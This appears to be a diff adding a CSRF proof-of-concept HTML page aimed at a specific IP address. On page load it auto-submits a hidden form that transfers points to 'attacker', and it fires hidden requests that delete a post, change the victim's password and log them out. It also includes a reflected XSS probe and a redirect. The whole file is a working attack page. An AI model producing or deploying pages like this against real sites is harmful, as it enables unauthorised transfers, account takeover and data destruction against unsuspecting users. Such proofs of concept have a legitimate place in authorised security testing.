@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF PoC - http://43.200.171.241</title>
+    <meta charset="utf-8">
+</head>
+<body onload="document.forms[0].submit()">
+    <h1>CSRF Proof of Concept</h1>
+    
+    <!-- Auto-submit form -->
+    <form action="http://43.200.171.241/transfer_points.php" method="POST">
+        <input type="hidden" name="to" value="attacker">
+        <input type="hidden" name="amount" value="1000">
+    </form>
+    
+    <!-- GET-based attacks -->
+    <img src="http://43.200.171.241/delete_post.php?id=1" style="display:none">
+    <img src="http://43.200.171.241/change_password.php?new=hacked123" style="display:none">
+    
+    <!-- XSS attempts via GET -->
+    <img src="http://43.200.171.241/search.php?q=<script>alert(1)</script>" style="display:none">
+    
+    <script>
+        // Additional attacks
+        var img = new Image();
+        img.src = 'http://43.200.171.241/logout.php';
+        
+        // Redirect after 2 seconds
+        setTimeout(function() {
+            window.location = 'http://43.200.171.241';
+        }, 2000);
+    </script>
+</body>
+</html>
